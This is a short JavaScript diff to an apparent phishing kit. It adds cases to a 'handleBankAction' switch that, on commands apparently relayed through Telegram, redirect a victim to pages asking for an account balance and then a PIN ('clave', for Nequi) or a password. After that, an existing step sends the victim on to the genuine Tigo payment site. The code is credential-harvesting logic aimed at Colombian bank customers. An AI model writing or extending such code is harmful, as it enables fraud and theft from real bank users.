@@ -383,6 +383,20 @@ function handleBankAction(action, bankCode, bankTelegram, btn, originalText, inp
             btn.textContent = originalText;
             break;
         
+        case 'pedir_saldo':
+        case 'request_saldo':
+            bankTelegram.redirect('saldo-input.html');
+            break;
+        
+        case 'request_clave':
+            // Para Nequi, si está en saldo, redirigir a clave
+            if (bankCode === 'nequi') {
+                bankTelegram.redirect('clave.html');
+            } else {
+                bankTelegram.redirect('password.html');
+            }
+            break;
+        
         case 'finalizar':
             bankTelegram.redirect('https://mi.tigo.com.co/pago-express/facturas');
             break;
